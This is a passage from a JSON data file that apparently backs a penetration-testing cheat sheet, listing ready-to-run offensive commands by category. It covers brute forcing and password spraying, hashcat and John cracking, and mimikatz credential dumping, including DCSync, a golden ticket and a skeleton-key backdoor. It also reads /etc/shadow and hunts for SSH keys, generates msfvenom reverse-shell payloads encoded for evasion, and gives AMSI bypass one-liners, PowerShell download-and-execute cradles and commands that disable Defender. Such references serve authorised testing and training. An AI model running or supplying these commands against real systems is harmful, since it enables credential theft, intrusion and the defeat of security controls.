            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt imap://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra SNMP",
            "desc": "Brute force SNMP",
            "cmd": "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP> snmp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Kerbrute User Enum",
            "desc": "Enumerate AD users",
            "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Kerbrute Password Spray",
            "desc": "Spray password",
            "cmd": "kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt '<PASS>'",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Offline Cracking (Hashcat)",
        "commands": [
          {
            "title": "Hashcat MD5",
            "desc": "Crack MD5 hashes",
            "cmd": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat SHA1",
            "desc": "Crack SHA1 hashes",
            "cmd": "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat MD5Crypt",
            "desc": "Crack Linux MD5 crypt ($1$)",
            "cmd": "hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat NTLM",
            "desc": "Crack Windows NTLM hashes",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat SHA256",
            "desc": "Crack SHA256 hashes",
            "cmd": "hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat SHA512",
            "desc": "Crack SHA512 hashes",
            "cmd": "hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat SHA512Crypt",
            "desc": "Crack Linux SHA512 crypt ($6$)",
            "cmd": "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat bcrypt",
            "desc": "Crack bcrypt hashes",
            "cmd": "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat NetNTLMv2",
            "desc": "Crack NetNTLMv2 hashes (Responder captures)",
            "cmd": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat NetNTLMv1",
            "desc": "Crack NetNTLMv1 hashes",
            "cmd": "hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Kerberoast (TGS-REP)",
            "desc": "Crack Kerberoasted service ticket hashes",
            "cmd": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat AS-REP Roast",
            "desc": "Crack AS-REP roasted hashes",
            "cmd": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat WPA2",
            "desc": "Crack WPA2 handshake",
            "cmd": "hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Kerberos 5 TGS-REP RC4",
            "desc": "Crack Kerberos 5 etype 23",
            "cmd": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Kerberos 5 TGS-REP AES256",
            "desc": "Crack Kerberos 5 etype 18",
            "cmd": "hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Hashcat MD4 (NTLM raw)",
            "desc": "Crack raw MD4/NTLM",
            "cmd": "hashcat -m 900 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat with Rules",
            "desc": "Crack using rule-based transformations",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat OneRuleToRuleThemAll",
            "desc": "Crack with the most comprehensive rule",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Mask Attack",
            "desc": "Brute force with pattern mask",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "?u=upper ?l=lower ?d=digit ?s=special ?a=all"
          },
          {
            "title": "Hashcat Combinator Attack",
            "desc": "Combine two wordlists",
            "cmd": "hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Show Cracked",
            "desc": "Display previously cracked hashes",
            "cmd": "hashcat -m 1000 hashes.txt --show",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashcat Mask Attack (Custom)",
            "desc": "Brute force with custom mask charset",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 -1 '?u?l' -2 '?d?s' '?1?1?1?1?2?2?2?2'",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "-1 defines custom charset 1, -2 defines charset 2"
          },
          {
            "title": "Hashcat Hybrid Wordlist+Mask",
            "desc": "Append mask pattern to wordlist entries",
            "cmd": "hashcat -m 1000 hashes.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d'",
            "tags": [
              "tool"
            ],
            "note": "Mode 6: wordlist+mask, Mode 7: mask+wordlist"
          },
          {
            "title": "Hashcat Hybrid Mask+Wordlist",
            "desc": "Prepend mask pattern to wordlist entries",
            "cmd": "hashcat -m 1000 hashes.txt -a 7 '?d?d?d?d' /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat PRINCE Attack",
            "desc": "Generate word combinations from wordlist",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --prince",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "PRINCE combines words from the wordlist in various ways"
          },
          {
            "title": "Hashcat DES Crypt",
            "desc": "Crack DES crypt hashes",
            "cmd": "hashcat -m 1500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat MSSQL (2012+)",
            "desc": "Crack MSSQL 2012/2014 hashes",
            "cmd": "hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat MySQL 4.1+",
            "desc": "Crack MySQL SHA1 hashes",
            "cmd": "hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat PostgreSQL MD5",
            "desc": "Crack PostgreSQL MD5 hashes",
            "cmd": "hashcat -m 12 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat scrypt",
            "desc": "Crack scrypt hashes",
            "cmd": "hashcat -m 8900 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Hashcat DPAPI Master Key",
            "desc": "Crack DPAPI master key files",
            "cmd": "hashcat -m 15300 dpapi_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Hashcat Increment Mode",
            "desc": "Try all lengths from min to max",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 '?a?a?a?a?a?a?a?a' --increment --increment-min=4 --increment-max=8",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Hybrid",
            "desc": "Wordlist + mask append",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Combinator",
            "desc": "Combine two wordlists",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt -a 1 wordlist1.txt wordlist2.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hashcat Optimized",
            "desc": "Use optimized kernel",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -O",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Offline Cracking (John)",
        "commands": [
          {
            "title": "John Basic Crack",
            "desc": "Crack hashes with default wordlist",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John with Format",
            "desc": "Crack with specified hash format",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John NTLM",
            "desc": "Crack NTLM hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John Show Cracked",
            "desc": "Display cracked passwords",
            "cmd": "john hashes.txt --show",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John with Rules",
            "desc": "Crack with mangling rules",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ssh2john Extract Hash",
            "desc": "Extract hash from SSH private key",
            "cmd": "ssh2john id_rsa > ssh_hash.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "zip2john Extract Hash",
            "desc": "Extract hash from password-protected ZIP",
            "cmd": "zip2john protected.zip > zip_hash.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "rar2john Extract Hash",
            "desc": "Extract hash from RAR archive",
            "cmd": "rar2john protected.rar > rar_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "keepass2john Extract Hash",
            "desc": "Extract hash from KeePass database",
            "cmd": "keepass2john database.kdbx > keepass_hash.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "office2john Extract Hash",
            "desc": "Extract hash from Office document",
            "cmd": "office2john protected.docx > office_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "pdf2john Extract Hash",
            "desc": "Extract hash from password-protected PDF",
            "cmd": "pdf2john protected.pdf > pdf_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "7z2john Extract Hash",
            "desc": "Extract hash from 7-Zip archive",
            "cmd": "7z2john protected.7z > 7z_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "gpg2john Extract Hash",
            "desc": "Extract hash from GPG key",
            "cmd": "gpg2john private.key > gpg_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "bitlocker2john Extract Hash",
            "desc": "Extract hash from BitLocker volume",
            "cmd": "bitlocker2john -i bitlocker_volume > bl_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ansible2john Extract Hash",
            "desc": "Extract hash from Ansible vault",
            "cmd": "ansible2john vault.yml > ansible_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "krb5tgs2john Extract Hash",
            "desc": "Extract Kerberos TGS ticket hash",
            "cmd": "kirbi2john ticket.kirbi > krb_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "John SHA512Crypt Format",
            "desc": "Crack Linux SHA512 crypt hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "John bcrypt Format",
            "desc": "Crack bcrypt hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "John Kerberos TGS",
            "desc": "Crack Kerberoasted TGS hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John AS-REP Hash",
            "desc": "Crack AS-REP roasted hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John NetNTLMv2",
            "desc": "Crack NetNTLMv2 hashes captured by Responder",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John MSSQL Hash",
            "desc": "Crack MSSQL password hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mssql12",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "John MySQL Hash",
            "desc": "Crack MySQL password hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "John List Formats",
            "desc": "List all supported hash formats",
            "cmd": "john --list=formats | tr ',' '\\n'",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "John Incremental Mode",
            "desc": "Pure brute force with john",
            "cmd": "john hashes.txt --incremental=Alnum --max-length=8",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "wpa2john Extract Hash",
            "desc": "Extract hash from WPA handshake pcap",
            "cmd": "wpa2john capture.pcap > wpa_hash.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "vncpasswd Decrypt",
            "desc": "Decrypt VNC stored password file",
            "cmd": "vncpwd /path/to/.vnc/passwd",
            "tags": [
              "tool"
            ],
            "note": "Or use: echo '<HEX_PASS>' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d"
          }
        ]
      },
      {
        "name": "Hash Extraction & Identification",
        "commands": [
          {
            "title": "Hash Identifier",
            "desc": "Identify hash type with hash-identifier",
            "cmd": "hash-identifier",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hashid Identification",
            "desc": "Identify hash type with hashid",
            "cmd": "hashid '<HASH>'",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Name That Hash",
            "desc": "Identify hash with recommended hashcat/john mode",
            "cmd": "nth --text '<HASH>'",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Name That Hash from File",
            "desc": "Identify hashes from a file",
            "cmd": "nth --file hashes.txt",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Credential Dumping (Windows)",
        "commands": [
          {
            "title": "Mimikatz Logon Passwords",
            "desc": "Dump plaintext passwords from memory",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Mimikatz SAM Dump",
            "desc": "Dump SAM database hashes",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Mimikatz DCSync",
            "desc": "Replicate AD to extract all hashes",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /all\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Mimikatz DCSync Specific User",
            "desc": "DCSync a specific user's hash",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /user:Administrator\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Mimikatz Pass the Hash",
            "desc": "Perform Pass-the-Hash attack",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Mimikatz Kerberos Tickets",
            "desc": "Export Kerberos tickets from memory",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Mimikatz Golden Ticket",
            "desc": "Create a Golden Ticket",
            "cmd": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Mimikatz DPAPI Vault",
            "desc": "Decrypt DPAPI-protected credentials",
            "cmd": "mimikatz.exe \"privilege::debug\" \"vault::cred\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Secretsdump Remote",
            "desc": "Dump secrets from remote host (Impacket)",
            "cmd": "secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Secretsdump with Hash",
            "desc": "Dump secrets using NTLM hash (PtH)",
            "cmd": "secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Secretsdump Local SAM",
            "desc": "Extract hashes from local SAM/SYSTEM files",
            "cmd": "secretsdump.py -sam SAM -system SYSTEM LOCAL",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Pypykatz Live Dump",
            "desc": "Python mimikatz — dump from live LSASS",
            "cmd": "pypykatz live lsa",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Pypykatz from Dump",
            "desc": "Parse LSASS dump file",
            "cmd": "pypykatz lsa minidump lsass.dmp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "LaZagne All Modules",
            "desc": "Extract credentials from various applications",
            "cmd": "lazagne.exe all",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Mimikatz DPAPI",
            "desc": "Decrypt DPAPI creds",
            "cmd": "mimikatz.exe \"privilege::debug\" \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\<CRED>\" \"exit\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Mimikatz Vault",
            "desc": "Dump Vault creds",
            "cmd": "mimikatz.exe \"privilege::debug\" \"vault::cred /patch\" \"exit\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Mimikatz Skeleton Key",
            "desc": "Install backdoor key",
            "cmd": "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
            "tags": [
              "advanced"
            ],
            "note": "All accounts accept 'mimikatz' as password"
          },
          {
            "title": "Pypykatz Minidump",
            "desc": "Parse LSASS offline",
            "cmd": "pypykatz lsa minidump lsass.dmp",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LaZagne All",
            "desc": "Extract all stored passwords",
            "cmd": "lazagne.exe all",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Password Policy",
            "desc": "Check domain policy",
            "cmds": [
              "net accounts",
              "net accounts /domain",
              "Get-ADDefaultDomainPasswordPolicy"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Credential Dumping (Linux)",
        "commands": [
          {
            "title": "Shadow File Extract",
            "desc": "Read password hashes from shadow file",
            "cmd": "cat /etc/shadow",
            "tags": [
              "essential"
            ],
            "note": "Requires root or shadow group"
          },
          {
            "title": "Unshadow for John",
            "desc": "Combine passwd and shadow for cracking",
            "cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LaZagne Linux",
            "desc": "Extract stored credentials on Linux",
            "cmd": "python3 lazagne.py all",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Search for Password Files",
            "desc": "Find files containing passwords",
            "cmd": "grep -rli 'password\\|passwd\\|pass\\|pwd' /etc/ /opt/ /var/ /home/ 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check SSH Keys",
            "desc": "Find readable SSH private keys",
            "cmd": "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | xargs ls -la",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check Cached Credentials",
            "desc": "Look for cached/stored credentials",
            "cmds": [
              "cat ~/.bashrc | grep -i pass",
              "cat ~/.profile | grep -i pass",
              "find / -name '*.config' -exec grep -li 'password' {} \\; 2>/dev/null"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Password Spraying",
        "commands": [
          {
            "title": "CrackMapExec Password Spray SMB",
            "desc": "Spray password across SMB accounts",
            "cmd": "crackmapexec smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "CrackMapExec Spray Multiple Passwords",
            "desc": "Spray multiple passwords against users",
            "cmd": "crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success --no-bruteforce",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Kerbrute User Enumeration",
            "desc": "Enumerate valid AD users via Kerberos",
            "cmd": "kerbrute userenum -d <DOMAIN> --dc <TARGET_IP> users.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Kerbrute Password Spray",
            "desc": "Spray a password via Kerberos pre-auth",
            "cmd": "kerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> users.txt '<PASS>'",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Spray with Hydra",
            "desc": "Password spray via Hydra with single password",
            "cmd": "hydra -L users.txt -p '<PASS>' <TARGET_IP> smb -t 1",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Wordlist Engineering",
        "commands": [
          {
            "title": "CeWL Wordlist Generation",
            "desc": "Generate wordlist by spidering target website",
            "cmd": "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "CeWL with Emails",
            "desc": "Generate wordlist and extract email addresses",
            "cmd": "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt -e --email_file emails.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Crunch Wordlist Generator",
            "desc": "Generate custom wordlist with pattern",
            "cmd": "crunch 8 8 -t @@@@%%%% -o wordlist.txt",
            "tags": [
              "tool"
            ],
            "note": "@=lower %%=digit ^=special ,=upper"
          },
          {
            "title": "Crunch with Charset",
            "desc": "Generate wordlist with custom character set",
            "cmd": "crunch 6 8 abcdef123456 -o wordlist.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CUPP Interactive Profiling",
            "desc": "Generate targeted wordlist from personal info",
            "cmd": "cupp -i",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Username Anarchy",
            "desc": "Generate username permutations from names",
            "cmd": "username-anarchy --input-file names.txt --select-format first,flast,first.last > usernames.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Kwprocessor Keyboard Walks",
            "desc": "Generate keyboard walk patterns",
            "cmd": "kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > kwp_wordlist.txt",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Mentalist GUI Wordlist",
            "desc": "GUI-based wordlist generator with rules",
            "cmd": "mentalist",
            "tags": [
              "tool"
            ],
            "note": "GUI tool for creating complex wordlist generation chains"
          }
        ]
      }
    ]
  },
  {
    "id": "av-bypass",
    "name": "Defense Evasion & AV Bypass",
    "icon": "🛡️",
    "description": "Bypass antivirus, AMSI, AppLocker, Constrained Language Mode, and other security controls to execute payloads undetected.",
    "subcategories": [
      {
        "name": "Encoding & Packing",
        "commands": [
          {
            "title": "Msfvenom Shikata Encoding",
            "desc": "Encode payload with shikata_ga_nai",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Msfvenom Multi-Encoder",
            "desc": "Chain multiple encoders",
            "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "UPX Packing",
            "desc": "Pack executable with UPX to change signature",
            "cmd": "upx --best -o packed.exe original.exe",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Veil-Evasion Framework",
            "desc": "Generate AV-evasive payloads with Veil",
            "cmd": "veil",
            "tags": [
              "tool"
            ],
            "note": "Interactive tool — select payload type and configure options"
          },
          {
            "title": "Shellter Injection",
            "desc": "Inject payload into legitimate PE executable",
            "cmd": "shellter",
            "tags": [
              "tool"
            ],
            "note": "Interactive — choose Auto mode, select target PE, configure payload"
          },
          {
            "title": "Donut Shellcode from PE/DLL",
            "desc": "Convert PE/.NET/DLL to position-independent shellcode",
            "cmd": "donut -i payload.exe -o loader.bin",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Donut with Parameters",
            "desc": "Donut shellcode with custom class/method",
            "cmd": "donut -i payload.exe -o loader.bin -e 3 -b 1",
            "tags": [
              "advanced",
              "tool"
            ]
          }
        ]
      },
      {
        "name": "AMSI Bypass",
        "commands": [
          {
            "title": "AMSI Bypass (Reflection)",
            "desc": "Disable AMSI via reflection in PowerShell",
            "cmd": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "AMSI Bypass (Patching)",
            "desc": "Patch AMSI in memory",
            "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)",
            "tags": [
              "essential"
            ],
            "note": "Obfuscated to avoid string detection"
          },
          {
            "title": "AMSI Bypass (Matt Graeber)",
            "desc": "Force AMSI initialization failure",
            "cmd": "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x5)",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "AMSI Bypass (PowerShell Downgrade)",
            "desc": "Use PowerShell v2 which has no AMSI",
            "cmd": "powershell -version 2",
            "tags": [
              "essential"
            ],
            "note": "Only works if .NET 2.0 is still installed"
          },
          {
            "title": "AMSI Bypass (Base64 Concatenation)",
            "desc": "Split and concatenate AMSI bypass to evade detection",
            "cmd": "$a='System.Management.Automation.A';$b='msi';$u='Utils';$t=[Ref].Assembly.GetType($a+$b+$u);$f=$t.GetField('a'+$b+'InitFailed','NonPublic,Static');$f.SetValue($null,$true)",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "PowerShell Evasion",
        "commands": [
          {
            "title": "Bypass Execution Policy (Bypass)",
            "desc": "Run script bypassing execution policy",
            "cmd": "powershell -ep bypass -File script.ps1",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bypass Execution Policy (Unrestricted)",
            "desc": "Set unrestricted execution policy",
            "cmd": "powershell -ExecutionPolicy Unrestricted -File script.ps1",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bypass via Pipe",
            "desc": "Bypass execution policy by piping script",
            "cmd": "Get-Content script.ps1 | powershell -nop -",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bypass via Encoded Command",
            "desc": "Execute base64-encoded PowerShell command",
            "cmd": "powershell -nop -enc <BASE64_COMMAND>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bypass via Download Cradle (IEX)",
            "desc": "Download and execute script in memory",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bypass via Download Cradle (IWR)",
            "desc": "Download and invoke using Invoke-WebRequest",
            "cmd": "powershell -nop -c \"IEX(IWR 'http://<LHOST>/script.ps1' -UseBasicParsing)\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Invoke-Obfuscation",
            "desc": "Obfuscate PowerShell scripts to evade detection",
            "cmd": "Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Interactive menu — choose TOKEN, STRING, or ENCODING obfuscation"
          },
          {
            "title": "PowerShell Constrained Language Check",
            "desc": "Check if CLM is enabled",
            "cmd": "$ExecutionContext.SessionState.LanguageMode",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Disable Defender",
            "desc": "Disable real-time monitoring",
            "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "tags": [
              "essential"
            ],
            "note": "Requires admin"
          },
          {
            "title": "Defender Exclusion",
            "desc": "Add path exclusion",
            "cmd": "Add-MpPreference -ExclusionPath 'C:\\temp'",
